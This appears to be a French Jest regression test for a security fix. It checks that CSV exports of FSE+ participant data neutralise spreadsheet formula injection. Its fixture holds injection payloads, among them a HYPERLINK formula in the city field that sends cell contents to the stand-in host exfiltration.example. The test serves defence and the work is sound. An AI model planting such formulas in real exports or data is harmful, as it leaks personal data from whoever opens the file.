// ═══════════════════════════════════════════════════════════════════════════
// REVUE DE SÉCURITÉ PR A — M-04 : injection de formule dans les exports CSV.
//
// `esc()` ne mettait entre guillemets que les cellules contenant « ; », « " »
// ou un saut de ligne. Une cellule qui COMMENCE par =, +, -, @, TAB ou CR
// partait donc telle quelle, et Excel / LibreOffice / Google Sheets
// l'interprètent comme une FORMULE à l'ouverture du fichier chez l'agent de la
// DDETS — le guillemetage n'y change rien, il est retiré avant l'évaluation.
//
// Le contenu de ces cellules vient de champs libres saisis ou importés
// (`employees.city`, `first_name`, `last_name`, `insertion_projets.nom`).
//
// TEST RETOURNÉ le 13/09 : il exigeait que `=1+1` et `@SUM(A1:A9)` sortent NUS
// (« vert = défaut présent ») ; il exige maintenant qu'ils sortent neutralisés,
// et que les NOMBRES produits par le code, eux, restent des nombres.
// ═══════════════════════════════════════════════════════════════════════════
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET || 'change-this-in-production';
process.env.JWT_SECRET = JWT_SECRET;

const mockQuery = jest.fn();
jest.mock('../../src/config/database', () => ({
  query: (...a) => mockQuery(...a),
  connect: async () => ({ query: (...a) => mockQuery(...a), release: () => {} }),
}));
jest.mock('../../src/middleware/activity-logger', () => ({
  autoLogActivity: () => (req, res, next) => next(),
  logActivity: () => {},
}));

const express = require('express');
const request = require('supertest');

let appExports;
const token = jwt.sign(
  { id: 1, username: 'rh.test', role: 'RH', first_name: 'T', last_name: 'U', mfa: true, mfa_at: Math.floor(Date.now() / 1000) },
  JWT_SECRET, { expiresIn: '1h' }
);

beforeAll(() => {
  appExports = express();
  appExports.use(express.json());
  appExports.use('/api/exports', require('../../src/routes/exports-fse'));
});

const PROJET = {
  id: 1, code: 'ASI-2026-2027', nom: 'Accompagnement Social Intensif 2026-2027',
  type: 'asi', financeur: 'FSE+', date_debut: '2026-01-01', date_fin: '2027-12-31',
  convention_ref: null, taux_forfaitaire_pct: null, cofinancement_ue_pct: 60, actif: true,
};

// Charge utile : une commune et un nom tels qu'un import de paie pourrait les
// porter. Aucun ne contient « ; » ni guillemet → `esc()` les laisse nus.
const PARTICIPANT_PIEGE = {
  employee_id: 5, date_entree: '2026-01-01', date_sortie: null, id: 5,
  first_name: '=1+1', last_name: '@SUM(A1:A9)',
  birth_date: '1988-04-12', gender: 'M',
  city: '=HYPERLINK("http://exfiltration.example/?d="&A2&B2,"Cliquez ici")',
  insertion_start_date: '2025-07-15', contract_end: '2026-08-21',
  brsa: true, ft_categorie: 'F', referent_unique_type: 'cms', parcours_num: 1,
  premier_cddi: '2025-07-15', fse_entree: {}, fse_entree_saisie_at: null, niveau_formation: null,
  fse_date_sortie: null, situation_sortie: null, saisie_at: null,
  situation_6mois: null, date_releve_6mois: null, criteres: 'brsa, deld',
};

beforeEach(() => {
  mockQuery.mockReset();
  mockQuery.mockImplementation((sql) => {
    const s = String(sql);
    if (/FROM insertion_projets WHERE id/.test(s)) return Promise.resolve({ rows: [PROJET] });
    if (/FROM insertion_projets WHERE actif/.test(s)) return Promise.resolve({ rows: [PROJET] });
    if (/FROM insertion_projet_participants pp\s+JOIN employees/.test(s)) return Promise.resolve({ rows: [PARTICIPANT_PIEGE] });
    if (/FROM employees e WHERE e\.id = ANY/.test(s)) return Promise.resolve({ rows: [{ ...PARTICIPANT_PIEGE, insertion_status: 'en_parcours' }] });
    return Promise.resolve({ rows: [] });
  });
});

describe('M-04 — injection de formule dans l’export FSE+ participants', () => {
  test('CORRIGÉ — une cellule commençant par « = », « @ » ou « + » est neutralisée', async () => {
    const res = await request(appExports)
      .get('/api/exports/fse-plus?projet=1&annee=2026&trimestre=1')
      .set('Authorization', `Bearer ${token}`);
    expect(res.status).toBe(200);

    const lignes = res.text.replace(/^﻿/, '').split('\n').filter((l) => l && !l.startsWith('#'));
    const ligneDonnee = lignes[1]; // [0] = en-tête des 29 colonnes
    const cellules = ligneDonnee.split(';');

    // Colonnes 2 et 3 (NOM, Prénom) — indices 1 et 2.
    expect(cellules[1]).toBe("'@SUM(A1:A9)");
    expect(cellules[2]).toBe("'=1+1");
    // La commune contient un guillemet : elle est ET préfixée ET guillemetée.
    // Le tableur déguillemette, trouve une apostrophe de tête, et n'évalue pas.
    const commune = cellules[5].replace(/^"|"$/g, '').replace(/""/g, '"');
    expect(commune.startsWith("'=HYPERLINK(")).toBe(true);
    // Et le contenu n'a pas été altéré au-delà du préfixe : on neutralise, on
    // ne tronque pas — l'agent doit lire la vraie commune, fût-elle absurde.
    expect(commune).toContain('exfiltration.example');
  });

  test('CORRIGÉ — les NOMBRES produits par le code restent des nombres', () => {
    // Garde-fou du correctif lui-même : préfixer un délai de saisie négatif le
    // transformerait en texte, et la colonne cesserait de se trier — c'est
    // précisément celle que l'instructeur « regarde en premier ».
    const { escCsv, neutraliserFormule } = require('../../src/utils/export-csv');
    expect(escCsv(-3)).toBe('-3');
    expect(escCsv(0)).toBe('0');
    expect(neutraliserFormule(-12, '-12')).toBe('-12');
    // …mais la même valeur reçue comme CHAÎNE depuis la base est neutralisée.
    expect(escCsv('-12')).toBe("'-12");
  });

  test('CORRIGÉ — les six amorces dangereuses sont couvertes, et elles seules', () => {
    const { escCsv } = require('../../src/utils/export-csv');
    // On compare le CONTENU de la cellule : une amorce « \r » déclenche aussi le
    // guillemetage CSV, donc la chaîne rendue commence par « " ». Ce qui compte
    // est que le tableau, une fois déguillemeté par le tableur, commence par
    // l'apostrophe qui force le mode texte.
    const contenu = (v) => {
      const c = escCsv(v);
      return c.startsWith('"') ? c.slice(1, -1).replace(/""/g, '"') : c;
    };
    for (const amorce of ['=', '+', '-', '@', '\t', '\r']) {
      expect(contenu(`${amorce}X`).startsWith("'")).toBe(true);
    }
    for (const sain of ['Rouen', '0612345678', 'Le Houlme', "L'Hôpital", '2026-01-01']) {
      expect(contenu(sain).startsWith("'")).toBe(false);
    }
  });

  test('référence — une cellule contenant « ; » est bien quotée (le seul cas traité)', async () => {
    const res = await request(appExports)
      .get('/api/exports/fse-plus?projet=1')
      .set('Authorization', `Bearer ${token}`);
    // La ligne « # Périmètre;… » prouve que le séparateur est bien « ; ».
    expect(res.text).toContain('# Périmètre;');
  });
});
